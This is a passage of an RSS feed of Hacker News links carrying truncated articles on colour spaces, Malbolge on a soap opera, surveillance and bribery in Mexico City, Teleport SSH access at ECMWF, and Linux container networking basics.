<p><img src="https://raphlinus.github.io/assets/colorspace_transfer_functions.png" width="575"></p>

<p>I found Björn’s arguments in favor of pure cube root to be not entirely compelling, but this is perhaps an open question. Both CIELAB and sRGB use a finite-derivative region near black. Is it important to limit derivatives for more accurate LUT-based calculation? Perhaps in 2021, we will almost always prefer ALU to LUT. The conditional part is also not ideal, especially on GPUs, where branches can hurt performance. I personally would explore transfer functions of the form $f(x) = a + (b + cx)^\gamma$, constrained so $f(0) = 0$ and $f(1) = 1$, as these are GPU-friendly and have smooth derivatives. The XYB color space used in JPEG XL apparently uses a bias rather than a piecewise linear region, as well. (Source: <a href="https://news.ycombinator.com/item?id=25525726">HN thread on Oklab</a>, as I wasn’t easily able to …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raphlinus.github.io/color/2021/01/18/oklab-critique.html">https://raphlinus.github.io/color/2021/01/18/oklab-critique.html</a></em></p>]]>
            </description>
            <link>https://raphlinus.github.io/color/2021/01/18/oklab-critique.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25836082</guid>
            <pubDate>Tue, 19 Jan 2021 17:38:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[KFC Mascot Col. Sanders Talks Malbolge Programming on General Hospital]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 75 (<a href="https://news.ycombinator.com/item?id=25835971">thread link</a>) | @asjo
<br/>
January 19, 2021 | https://esoteric.codes/blog/kfc-col-sanders-talks-malbolge-general-hospital | <a href="https://web.archive.org/web/*/https://esoteric.codes/blog/kfc-col-sanders-talks-malbolge-general-hospital">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><img src="https://esoteric.codes/uploads/6fcaac97-a79b-4d89-982d-fe0823edb7e0/ColSanders.jpg" alt="" width="" height=""><br><em>"It's not his fault he doesn't know mal Bogle" says Col. Sanders</em></p>
<p>"I was once cursed by a warlock," says Col. Harlan Sanders, in not even his most unhinged piece of dialogue on this General Hospital episode.</p>
<p>Sanders is visiting character Maxie Jones to request she secure his secret recipe (all 11 herbs and spices), which had been threatened by a bomb Sanders himself defused using the classic esolang Malbolge. Unfortunately, this all happens offscreen.</p>
<p>Damian Spinelli, mentioned by Sanders, is a private investigator / hacker who General Hospital's casting describes as a mix between Seth Green and Sean Penn's Spicoli. Spinelli is unable to defuse the bomb, not knowing Malbolge, but Sanders had picked up a little of the Turing Tarpit as one randomly does (apparently without learning how to pronounce it) and saves the (only copy of this?) recipe from being incinerated.</p>
<p>Sanders feels no reservations about then asking Jones to then hide this recipe which has attracted this violence, which she does without question.</p>
<p>The full scene is here in two parts:</p>
<p><iframe src="https://www.youtube.com/embed/GO8tIMQHFig" width="400" height="225" frameborder="0" allowfullscreen=""></iframe> <iframe src="https://www.youtube.com/embed/6J3bI261tBQ" width="400" height="225" frameborder="0" allowfullscreen=""></iframe></p>
<p>Links: <a href="https://www.youtube.com/watch?v=GO8tIMQHFig" target="_blank" rel="noopener">Part 1</a> and <a href="https://www.youtube.com/watch?v=6J3bI261tBQ" target="_blank" rel="noopener">Part 2</a></p>
<p>For those who suspect this is created by a prankster, here it is tweeted by <a href="https://twitter.com/generalhospital/status/1015384908192190464?lang=en" target="">the show's account</a>.</p>

<p>Why, once again, is the esolang Malbolge chosen for an absurd tv storyline?</p>
<p>It is almost certainly tied to Malbolge's explicit connection with encryption; Malbolge programs self-encrypt as they run and writing Malbolge programs is a matter of finding "weaknesses" in the system that can be exploited in order to write working programs. While brainfuck is by far the widest-known esolang among programmers, Malbolge occasionally, and quite randomly, appears in a wider cultural context, always in terms of leetness, encryption, and mystery. Most likely, the General Hospital writers picked it up watching <em>Elementary</em>, which <a href="https://esoteric.codes/blog/interview-with-ben-olmstead" target="">included a Malbolge program left as a clue</a> from a killer.</p>
<p>Malbolge is the focus of the "weird internet," most notably in the <a href="https://esoteric.codes/blog/a-malbolge-mystery-c0d3-attorney" target="">still-unexplained site c0d3.attorney</a>. While c0d3.attorney does not offer any insight into Malbolge—the "programs" it lists don't work—it, like General Hospital, affirms Malbolge's status as <em>the</em> weird esolang. Ben Olmstead, Malbolge's creator, comments on the appearance:</p>
<blockquote>
<p>If anything, I think it illustrates how random culture can be: a weird throwaway thing—made in an afternoon—gets referenced on popular TV shows, has academic papers written about it, and still gets mentions on Twitter, 20 something years later. Meanwhile, people put in years or decades of work to create things that just... disappear.</p>
</blockquote>
<p>But that is how things work when your work of art or code helps inspire so much that comes after it.</p>
<p><strong>UPDATE</strong>: <a href="https://news.ycombinator.com/item?id=25835971" target="">Discussion of this post on Hacker News</a></p>
<p>found <a href="https://twitter.com/McGuire_GIS/status/1342556565484826626" target="">via @McGuire_GIS</a></p>

            </div></div>]]>
            </description>
            <link>https://esoteric.codes/blog/kfc-col-sanders-talks-malbolge-general-hospital</link>
            <guid isPermaLink="false">hacker-news-small-sites-25835971</guid>
            <pubDate>Tue, 19 Jan 2021 17:30:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Annoying Technology]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25835498">thread link</a>) | @ggoo
<br/>
January 19, 2021 | https://annoying.technology/posts/c7ed76cc86e56cc4/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/c7ed76cc86e56cc4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/0f99e5761dcc322451f384044d8fd1cf7d41e5db/ca081/media/clicktarget.jpg"></p><p>Guess what happens if you click on the profile picture or “Justin”?</p><p>If you — like I did myself — guessed that it opens the Apple Music profile of the person (like it’s the case for all other instances where you see someone’s profile picture in the Music.app) you’d be <em>wrong</em>.</p><p>What actually happens: It immediately sends a follow request to the person just like if you clicked the “Follow” button. This is especially infuriating if there are multiple people with the same name and default avatar and you don’t know who’s who.</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/c7ed76cc86e56cc4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25835498</guid>
            <pubDate>Tue, 19 Jan 2021 16:59:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where surveillance cameras work but the justice system doesn’t]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25835336">thread link</a>) | @RealDeinonychus
<br/>
January 19, 2021 | https://restofworld.org/2021/mexico-city-security-theater/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/mexico-city-security-theater/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p><span>O</span>n the evening of October 9, 2013, 50-year-old elementary school teacher Laura Ramírez was run over by a car and killed on Avenida Dr. José María Vertiz near downtown Mexico City. The vehicle fled the scene.</p>



<p>Authorities contacted Ramírez’s only close family member: her daughter, Veronica, then a 22-year-old student. They asked her to come to the prosecutor’s office to identify her mother’s body and give a statement. Veronica arrived around 10 p.m. that night, accompanied by an uncle and a handful of friends. She had no idea how the process worked — that, for instance, she was entitled to legal representation and counseling. Through her shock and grief, however, Veronica had the presence of mind to realize that there were security cameras at the intersection where her mother had been killed. </p>



<p>Mexico City is home to an enormous urban surveillance system, the <em>Centro de Comando, Control, Cómputo, Comunicaciones y Contacto Ciudadano</em>, otherwise known as the C5. Because the hit-and-run had occurred on a major road, the system’s cameras were in place to capture it. “There were at least four along the path the car took,” she remembers. She immediately mentioned this to the officials. Thanks to the footage, she hoped, the police would at least be able to identify the car, track down the driver and catch her mother’s killer. An officer responded that given the gravity of the crime, the footage would automatically be set aside. Veronica pushed: Did she need to do anything to secure the videos? The officer assured her that it was all part of official protocol: The police would request the evidence and add it to the investigation file.</p>



<p>As Veronica stood outside the office between interviews, a man who identified himself as a legal aide for the prosecutor’s office approached her and asked if they could speak privately. Veronica found the request strange, but her friends encouraged her to go, and she followed the man into a private office. He asked her to repeat her account of the incident, which he took down with a brown marker on sheets of scrap paper. “There are two things you need to do,” he told her. “You’re going to need the videos, and you have to take them to the morgue. For both of those things, I’m going to charge you 4,000 pesos (roughly $200).” The demand caught Veronica by surprise. She argued, but he gave her an ultimatum: The recordings, he pointed out, were erased once a week, and they could easily vanish. “Either they’ll get lost, or you’ll give me the money.”</p>



<p>Initially, Veronica refused to pay the bribe. She didn’t even have enough to bury her mother. But friends who had accompanied her to the station managed to scrape together 2,500 of the 4,000 pesos, which they gave to the aide. The bribe would at least ensure, they hoped, that authorities would secure the C5 footage and solve the hit-and-run.</p>



<p>But when Veronica returned to the office to follow up on the investigation weeks later, officials claimed that the videos weren’t available, despite their previous promises. Eventually, they informed Veronica that they did have two relevant clips from that night. One showed the headlights of an approaching car, but just before it came into view, the camera turned to face another direction. The other captured the intersection several hours after the accident took place. Neither involved the car that killed Veronica’s mother.</p>



<p>The officials, Veronica learned, hadn’t filed the necessary paperwork. Instead of requesting the five relevant recordings, they had requested only two. “Because I didn’t give them the full amount of money, it was like the fee only covered what they got me,” she recalls. And since private citizens can’t solicit C5 videos, she had no other recourse. Two years later,<strong> </strong>with no further progress made, the case was closed. It was classified as “unresolved” and, moreover, as “unresolvable.” Instead of helping her find her mother’s killer, Veronica laments, “this technology, which is supposed to be an instrument of justice, became a chip for extortion.”</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/c5cdmx0015-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/c5cdmx0015-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/c5cdmx0015-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/01/c5cdmx0015-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/01/c5cdmx0015-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/01/c5cdmx0015-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/01/c5cdmx0015-2800x1868.jpg 2800w, " sizes="(max-width: 640px) 100vw, 600px(max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="Veronica Ramirez's mother was killed in a hit and run. The murder was caught on camera, but officials asked for a bribe to release the footage.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>Since the 2009 inauguration of the C5 <a href="http://www.caepccm.df.gob.mx/antecedentes">(then known as CAEPCCM or C4i4</a>), Mexico City’s authorities have prided themselves on having one of the most ambitious and sophisticated video surveillance systems in the world. The C5 <a href="https://www.c5.cdmx.gob.mx/">encompasses</a> more than 15,000 units, with more than 30,000 cameras, 12,700 loudspeakers, and 15,000 panic buttons, spread over 1,485 square kilometers.<strong> </strong>Each unit includes environmental sensors to detect unusual weather, seismic events, gunshots, and explosions. Everything runs on a fiber-optic network, and data is channeled to control rooms and mobile response units linked to 911 call centers and a missing-persons hotline. In addition, there are four command-and-control centers (known as C2), which focus on specific neighborhoods, and mobile units that can be deployed to monitor large public events. On major highways, cameras are equipped with software to automatically detect license plates. The city has spent more than MX$13 billion (about $660 million) in total on the infrastructure and software, and in 2019, another billion pesos (about $50 million) was budgeted to replace and update cameras.</p>



<p>Mexico City proper has nearly 9 million inhabitants, and when one includes the surrounding metropolitan area — a region nearly ten times the size of New York City — that number reaches 22 million. Within it, one finds densely packed self-built settlements, rural farming communities barely reachable by paved roads, and some of the most desirable real estate in Latin America. Climbing property values, however, are a relatively new phenomenon. In the 1980s and 1990s, Mexico City, formerly known as DF, the Distrito Federal, was notorious for its pollution and high crime rates, which earned it the nickname “El Defectuoso” — the Defective.</p>



<p>As the city’s authorities worked to change the capital’s image, the C5 was supposed to fulfill a world-class promise. In exchange for near-constant surveillance, residents would see their home become cleaner, safer, more data-driven, a destination for both tourists and capital. But that hasn’t happened. Mexico City’s district attorney estimated last year that <a href="https://www.jornada.com.mx/2019/04/27/capital/030n1cap?partner=rss">94% of crimes in</a> her jurisdiction go unreported. Of the fraction of homicides that have been reported, more than<a href="https://www.impunidadcero.org/uploads/app/articulo/131/contenido/1575312021S66.pdf"> 86% remain unresolved</a>. Furthermore, only a tiny number of police investigations involve evidence taken from C5 cameras. According to an ex-C5 official, Rafael Prieto Curiel, only 0.002% of crimes committed in Mexico City are captured on tape.</p>



<p>A handful of high-profile cases over the years have relied on the C5 system. But it’s far more common, cliché even, for police to tell victims that the relevant camera wasn’t working at the moment of the crime, or, as Veronica experienced, that the footage is no longer available. According to an as-yet-unpublished report from the think tanks Data Cívica and R3D, approximately 60% of crimes in the city take place within 200 meters of a C5 camera, but police use C5 footage in less than 1% of investigations. This isn’t the result of technical problems: According to government data, approximately 14,000 of the 15,000 modules are functioning at any given time. Nor is it a matter of storage capacity; most cameras auto-delete every seven days, and official protocol dictates that all videos related to a crime be saved once a report has been filed.</p>



<p>The C5 is a powerful tool. But like any tool, it’s only as useful as the person who wields it. Just as the C5 can help solve investigations, it can also be leveraged by police and prosecutors’ offices to support existing forms of criminality. In Veronica’s case, C5 footage became collateral for extortion. In other instances, police have been known to leak confidential photos and videos to the crime press, the <em>nota roja</em>. “If the videos benefit the police or the prosecution, they’re leaked to the media,” says Alejandro Jiménez, a criminal defense lawyer who has come up against the system’s limitations in court. “If the videos make them look bad, the police disappear the footage.” To those allegations, officials tend to repeat the same lines: <em>The cameras weren’t working. The footage was lost. That incident never happened. </em>And when police themselves are involved in crimes, impunity is all but guaranteed.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/c5cdmx0006-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/c5cdmx0006-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/01/c5cdmx0006-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/01/c5cdmx0006-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/01/c5cdmx0006-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/01/c5cdmx0006-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/01/c5cdmx0006-2800x1868.jpg 2800w, " sizes="(max-width: 640px) 100vw, calc(100vw - 40px)" alt="Most of Mexico Citys downtown intersections are covered by the C5 security system.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<hr>



<p><strong>Late on a</strong> Thursday night in February 2017, Carlos — whose name has been changed because of fear of retaliation — stumbled out of El Botellón, an upscale tapas bar in the trendy Condesa neighborhood. The 26-year-old had been drinking with friends since the afternoon. They had started at a nearby cantina, then migrated to the bar, and by the time Carlos called his Uber, the day had taken its toll on him. While waiting for his ride on Tamaulipas, an avenue home to a smattering of trendy bars, cafes, and restaurants, Carlos tripped and fell onto the sidewalk. As he pulled himself up, two police officers approached and began to berate him. “They told me I was way too drunk, that it was public indecency,” he recalls. The officers grabbed him, one from behind, and attempted to wrestle him into a police car. He felt a blow to the face. After that, he remembers nothing.</p>



<p>It was still dark when Carlos woke up and found himself sprawled on the asphalt of a residential street. His legs ached, his face felt tender, and his leather jacket was matted with blood. As he gathered himself, Carlos registered his surroundings: He was in the upper-middle-class Nápoles neighborhood — several kilometers south of the bar where he had been drinking. Between the bar and the spot where he had awoken, if they’d taken the most direct route, Carlos and the police would have passed a few dozen C5 cameras at least. On his way to work, still visibly injured, Carlos ran into two coworkers who, shocked by his appearance, called for emergency help.<strong> </strong>A police …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2021/mexico-city-security-theater/">https://restofworld.org/2021/mexico-city-security-theater/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2021/mexico-city-security-theater/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25835336</guid>
            <pubDate>Tue, 19 Jan 2021 16:48:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Giving third parties access to your supercomputers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25835098">thread link</a>) | @twakefield
<br/>
January 19, 2021 | https://goteleport.com/blog/secure-access-supercomputers/ | <a href="https://web.archive.org/web/*/https://goteleport.com/blog/secure-access-supercomputers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      <a href="https://goteleport.com/blog/index.xml"><i></i></a>
      
      

        

<p><img src="https://goteleport.com/blog/images/2021/ecmwf-case-study-header.png" width="100%" alt="ecmwf case study"></p>

<p>To the average person, weather forecasts inform whether or not they need to bring an umbrella to the office. But to some, it can be quite literally a matter of life and death. Organizations like the European Center for Medium Range Weather Forecasting (ECMWF) sit at the center of a web of highly sensitive operations, providing them weather predictions and reports. Whether that is for space agencies, natural disaster response, or the military, the accuracy of their forecasts are core to the decision making process.</p>

<p>So, it’s no wonder the ECMWF manages one of the world’s largest supercomputing clusters to run computationally-expensive predictive models. This post goes in-depth on how the ECMWF used Teleport to grant secure shell access to scientists and researchers without encumbering them with esoteric ssh commands and configuration.</p>

<p>Teleport is an OSS tool that consolidates SSH access across all environments, implements security, meets compliance requirements, and has complete visibility with a developer-friendly solution that doesn’t get in the way.</p>

<p><img src="https://goteleport.com/blog/images/2021/ecmwf-case-study-1.png" width="60%" alt="ecmwf logo"></p>

<h3 id="about-ecmwf-https-www-ecmwf-int">About <a href="https://www.ecmwf.int/">ECMWF</a></h3>

<p>The European Center for Medium Range Weather Forecasting is an independent organization, supported by participating member states. Hosting one of the largest supercomputing facilities and meteorological data stores in the world, the ECMWF provides invaluable forecasting predictions and reporting. The organization is a key component of Europe’s meteorological infrastructure, working with various national weather services to inform weather conditions for seaports, emergency response, airports, and space agencies. For nearly 50 years, the ECMWF has remained Europe’s foremost pooling of meteorological resources.</p>

<h2 id="reconsidering-secure-remote-access">Reconsidering Secure Remote Access</h2>

<p>The ECMWF’s 10-year goals, set in 2016, had ambitious mandates; one of which required moving their datacenter from Reading, England to Bologna, Italy. The relocation was a massive undertaking, requiring multinational collaboration to move and construct a state-of-the-art data center in a 9,000 square meter facility. The infrastructure team at the ECMWF would use this opportunity to refurbish outdated services, one of which included a remote access service for members that needed to connect a shell to ECMWF’s computing powerhouse.</p>

<p>As with most growing organizations, the ECMWF’s existing in-house solution, ecAccess, became difficult to maintain. Design choices from a decade ago prevented the adoption of new technologies like OIDC, and changing dependencies required more customer support resources. To achieve the goals set in the Roadmap to 2025 initiative, the infrastructure team would go on to uproot ecAccess and transplant it with a modern remote access tool. One that would improve security, provide greater visibility, and most importantly, scale with them.</p>

<blockquote>
<p>A key priority for ECMWF is on the one hand to remain an attractive proposition for the best scientists in the world, whilst at the same time ensuring it can provide them with the best-fitted computing capability to deliver our core mission.
<small><a href="https://www.ecmwf.int/sites/default/files/ECMWF_Roadmap_to_2025.pdf">Source</a></small></p>
</blockquote>

<h2 id="accessing-supercomputing-clusters">Accessing Supercomputing Clusters</h2>

<h3 id="ecaccess-legacy-access-tooling">ecAccess - Legacy Access Tooling</h3>

<p>The two computational behemoths housed by the ECMWF included a high performance computing Linux cluster and two <a href="https://en.wikipedia.org/wiki/Cray_XC40">Cray XC40s</a> that constitute its supercomputer. Capable of up to hundreds of teraflops in processing power,  these facilities are utilized by ECMWF’s users to perform data science and build machine learning models.  Typically these jobs required remote shell access via SSH, which also exposes a way for hackers to siphon supercomputing resources. A recent example was the coordinated attempt to use other European supercomputers for <a href="https://www.zdnet.com/article/supercomputers-hacked-across-europe-to-mine-cryptocurrency/">mining cryptocurrencies</a>.  For the ECMWF, the stakes are higher with large volumes of their data directly supporting emergency services. Days or even weeks of downtime is not tolerable.</p>

<p><img src="https://goteleport.com/blog/images/2021/ecmwf-case-study-2.png" width="100%" alt="eaccess architecture diagram"></p>

<p><small>Figure 1: ecAccess Architecture</small>
Running a standard ssh agent, scientists from all around Europe could connect to the ecAccess gateway and would be greeted with a login prompt. At the bottom of the CLI, users are asked to enter a one time password they receive from an authenticator app. Despite being a preferred method of primary authentication, SSH keys were not given to any users - the risk being too high to leave keys across thousands of local machines and let them be copied, misplaced, or misused.</p>

<h3 id="growing-pains">Growing Pains</h3>

<p>Having matured into a vital coordinated effort across Europe, the ECMWF expanded their reach and computational capability. Among them would include a growing  staff of sysadmins and analysts supporting over 500 distinct internal systems to aid the work of thousands of personnel from an increasing list of member states.</p>

<p>An important build vs. buy variable is the cost of maintaining internally-built software. The problem with this calculation is that, over time, costs may unpredictably change. Consider a couple of the reasons the ECMWF felt this pain:</p>

<ul>
<li><p><strong>Upgraded Dependencies</strong> - Having built custom ssh libraries for ecAccess, the infrastructure team had to keep pace with updates to the protocol and maintain forward compatibility. <strong>Support Resources</strong> - Over time, two vectors forced scarce support resources to be diverted to ecAccess. The ECMWF’s growth brought in a diverse base of users. They were faced with language barriers and users that did not have the requisite knowledge to use ecAccess without a GUI. Amplifying an already complicated process, ecAccess documentation grew more confusing.</p></li>

<li><p><strong>Outdated Technology</strong> -  Nowadays it is quite common to use SAML or OIDC protocols to authenticate against an identity provider and MFA with physical tokens like Yubikeys. Having barely existed at the time, ecAccess could not adopt either open standard. Instead, the ECMWF was bound to a single authentication flow for decades - entering a OTP for every shell connection - while the rest of the world took advantage of  single-sign on. Amplifying this frustration, significant resources had been fed into updating the ECMWF’s identity management systems, something they cannot fully integrate with until authentication can be decoupled from ecAccess.</p></li>
</ul>

<h2 id="what-modern-secure-access-means">What Modern Secure Access Means</h2>

<p>ECMWF had some precise requirements guiding their search for potential successor technologies: Not only did the upgrade have to be resistant to the pressures building inside ecAccess, but could fit within the constraints the ECMWF worked under.</p>

<table>
   <thead>
      <tr>
        <th>Technical Requirements</th>
        <th>Constraint</th>
      </tr>
   </thead>
  <tbody><tr>
   <td>  
      <h4>Backward Compatibility</h4>
   </td>
    <td>
        <h3>OpenSSH Clients of Any Flavor</h3>
        <p>Being a public utility, the ECMWF’s computational power is accessed by employees at third parties. With limited control over what client software is run, the infrastructure team had to stay compatible with a range of different OpenSSH and OS versions.</p>
    </td>
  </tr>
  <tr>
   <td>  
      <h4>Security Externalities</h4>
   </td>
    <td>
        <h3>Locked Down Environments</h3>
        <p>The users that constitute the ECMWF ecosystem largely consist of mission critical and life-saving public infrastructure. The cybersecurity standards upheld at these organizations often batten down computing environments. Any client-side software would need to be minimal and militantly secure.</p>
    </td>
  </tr>
  <tr>
   <td>  
      <h4>Session Logins</h4>
   </td>
   <td>
      <h3>Keys without Key Management</h3>
      <p>Key based authentication allows for clear session logins and leave key fingerprints. However, issuing SSH keys was never a viable option of the ECMWF. Keys would have to be distributed to a changing user base with little control over what happens to those keys. Instead, they employed the one-time password authentication pattern.</p>
    </td>
  </tr>
</tbody></table>

<h2 id="transparency-in-open-source">Transparency in Open Source</h2>

<p>Like most Linux shops, especially one that creates and freely distributes software themself, the staff at ECMWF had a healthy appreciation for open-source software. So when they first came across Teleport as a possible fit, they immediately went to the Github repo.</p>

<blockquote>
<p>Transparency is a big thing, we can look for ourselves and say ‘Yes, that’s [Teleport] quality and it’s done by people who know what they’re doing.’
<br><small>Oliver Gorwits - Manager at ECMWF</small></p>
</blockquote>

<p>As engineers, the team felt reassured in knowing they could collaborate with a community that would continually improve the software. But as a service operator, the ECMWF needed commercial support - someone to pick up the phone.</p>

<h2 id="teleport-for-secure-remote-access">Teleport for Secure Remote Access</h2>

<p>In the end, the infrastructure team at ECMWF chose Teleport as their solution. Adding some color to this decision, recall that the ECMWF evaluated tools that met minimum requirements and improved both security and ease of use.</p>

<table>
   <thead>
        <tr>
            <th>Technical Requirements</th>
            <th>How Teleport Fit</th>
        </tr>
   </thead>
    <tbody><tr>
        <td>
         <h4>Backward Compatibility</h4>
            <p>Teleport needed to be highly portable, supporting various flavors of clients, servers, and operating systems. Altogether, the ECMWF faced hundreds of permutations it must accommodate.</p>
      </td>
        <td>
            <ul>
                <li>    
               <a href="https://goteleport.com/teleport/docs/openssh-teleport/#using-openssh-client">Teleport supported OpenSSH clients</a> from v6.9 onwards
            </li>
               <li>Teleport <a href="https://goteleport.com/teleport/download/">binaries could be downloaded</a> for all manners of Linux distributions, including RPM, RHEL, DEB, and ARM as well as MacOS.</li>
                <li>Sacrificing advanced features, Teleport can run in agentless mode. It is deployed solely as a proxy, no daemon needs to run on SSH servers.</li>
            </ul>
        </td>
    </tr>
    <tr>
        <td>    
         <h4>Security Externalities</h4>
            <p>Running in production in many regulated or restricted environments already, Teleport had passed security reviews on my occasions.</p>
      </td>
        <td>
            <ul>
                <li>Teleport is <a href="https://goteleport.com/resources/audits/">audited yearly</a> by  <a href="https://doyensec.com/index.html">Doyensec</a>, a firm with notable cybersecurity research contributions.</li>
                <li>Under 50 MBs in size, Teleport comes as a single binary without any external dependencies. A separate binary exists for those who only need the Teleport client.</li>
                <li>Being a recognized  <a href="https://landscape.cncf.io/selected=teleport">member of the CNCF</a>, Teleport is validated in the open source community.</li>
            </ul>
        </td>
    </tr>
    <tr>
        <td>    
         <h4>Session Logins</h4>
            <p>The safest among ssh authentication protocols, certificates provide the highest quality of life. But they are notoriously difficult to implement. The ECMWF …</p></td></tr></tbody></table></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://goteleport.com/blog/secure-access-supercomputers/">https://goteleport.com/blog/secure-access-supercomputers/</a></em></p>]]>
            </description>
            <link>https://goteleport.com/blog/secure-access-supercomputers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25835098</guid>
            <pubDate>Tue, 19 Jan 2021 16:29:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Container networking is simple (2020)]]>
            </title>
            <description>
<![CDATA[
Score 247 | Comments 57 (<a href="https://news.ycombinator.com/item?id=25834444">thread link</a>) | @zdw
<br/>
January 19, 2021 | https://iximiuz.com/en/posts/container-networking-is-simple/ | <a href="https://web.archive.org/web/*/https://iximiuz.com/en/posts/container-networking-is-simple/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a name="cut"></a>
Working with containers always feels like magic. In a good way for those who understand the internals and in a terrifying - for those who don't. Luckily, we've been looking under the hood of the containerization technology for quite some time already and even managed to uncover that <a href="https://iximiuz.com/en/posts/not-every-container-has-an-operating-system-inside/#container-is-just-a-processes">containers are just isolated and restricted Linux processes</a>, that <a href="https://iximiuz.com/en/posts/you-dont-need-an-image-to-run-a-container/">images aren't really needed to run containers</a>, and on the contrary - <a href="https://iximiuz.com/en/posts/you-need-containers-to-build-an-image/">to build an image we need to run some containers</a>.</p>
<p>Now comes a time to tackle the container networking problem. Or, more precisely, a single-host container networking problem. In this article, we are going to answer the following questions:</p>
<ul>
<li>How to virtualize network resources to make containers think each of them has a dedicated network stack?</li>
<li>How to turn containers into friendly neighbors, prevent them from interfering, and teach to communicate well?</li>
<li>How to reach the outside world (e.g. the Internet) from inside the container?</li>
<li>How to reach containers running on a machine from the outside world (<em>aka</em> port publishing)?</li>
</ul>
<p>As a result, it'll become apparent that the single-host container networking is nothing more than a simple combination of the well-known Linux facilities:</p>
<ul>
<li>network namespaces;</li>
<li>virtual Ethernet devices (veth);</li>
<li>virtual network switches (bridge);</li>
<li>IP routing and network address translation (NAT).</li>
</ul>
<p>And for better or worse, no code is required to make the networking magic happen...
<a name="eofcut"></a></p>
<h2 id="prerequisites">Prerequisites</h2>
<p>Any decent Linux distribution would probably suffice. All the examples in the article have been made on a fresh <em>vagrant</em> CentOS 8 virtual machine:</p>
<pre><code>$ vagrant init centos/8
$ vagrant up
$ vagrant ssh

[vagrant@localhost ~]$ uname -a
Linux localhost.localdomain 4.18.0-147.3.1.el8_1.x86_64</code></pre>
<p>For the sake of simplicity of the examples, in this article, we are not going to rely on any fully-fledged containerization solution (e.g. <em>docker</em> or <em>podman</em>). Instead, we'll focus on the basic concepts and use the bare minimum tooling to achieve our learning goals.</p>
<h2 id="a-namenetnsaisolating-containers-with-network-namespaces"><a name="netns"></a>Isolating containers with network namespaces</h2>
<p>What constitutes a Linux network stack? Well, obviously, the set of network devices. What else? Probably, the set of routing rules. And not to forget, the set of netfilter hooks, including defined by iptables rules.</p>
<p>We can quickly forge a non-comprehensive <code>inspect-net-stack.sh</code> script:</p>
<pre><code>#!/usr/bin/env bash

echo "&gt; Network devices"
ip link

echo -e "\n&gt; Route table"
ip route

echo -e "\n&gt; Iptables rules"
iptables --list-rules</code></pre>
<p>Before running it, let's taint the iptables rules a bit to make them recognizable:</p>
<pre><code>$ sudo iptables -N ROOT_NS</code></pre>
<p>After that, execution of the inspect script on my machine produces the following output:</p>
<pre><code>$ sudo ./inspect-net-stack.sh
&gt; Network devices
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
    link/ether 52:54:00:e3:27:77 brd ff:ff:ff:ff:ff:ff

&gt; Route table
default via 10.0.2.2 dev eth0 proto dhcp metric 100
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100

&gt; Iptables rules
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-N ROOT_NS</code></pre>
<p>We are interested in that output because we want to make sure that each of the containers we are going to create soon will get a separate network stack.</p>
